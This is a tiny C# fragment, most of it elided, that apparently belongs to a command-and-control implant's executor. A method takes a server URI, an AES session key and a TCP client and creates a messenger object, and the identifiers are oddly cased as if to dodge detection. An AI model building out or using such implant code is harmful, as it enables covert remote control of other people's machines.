...
namespace GrawlExecutor
{
    class Grawl
    {
        public static void Execute(string RedWolfURI, string ANOTHERID, Aes SessKEy, TcpClient client)
        {
            try
            {
                ...
                BridgeMessenger bAsemEsSenger = new BridgeMessenger(RedWolfURI, ANOTHERID, ProfileWriteFormat);
